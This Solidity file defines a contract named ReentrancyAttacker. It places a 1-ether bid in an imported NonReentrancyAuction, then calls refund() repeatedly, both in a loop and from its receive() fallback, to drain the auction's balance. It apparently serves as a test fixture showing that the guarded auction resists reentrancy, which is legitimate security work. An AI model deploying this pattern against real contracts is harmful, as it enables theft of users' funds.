// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./NonReentrancyAuction.sol";

contract ReentrancyAttacker {
    uint constant private BID_AMOUNT = 1 ether;
    NonReentrancyAuction private auction;

    constructor(address _auction) {
        auction = NonReentrancyAuction(_auction);
    }

    function proxyBid() external payable {
        require(msg.value == BID_AMOUNT, "incorrect");
        auction.bid{value: msg.value}();
    }

    function attack() external {
        while(auction.currentBalance() >= BID_AMOUNT) {
            auction.refund();
        }
    }

    receive() external payable {
        if(auction.currentBalance() >= BID_AMOUNT) {
            auction.refund();
        }
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }
}
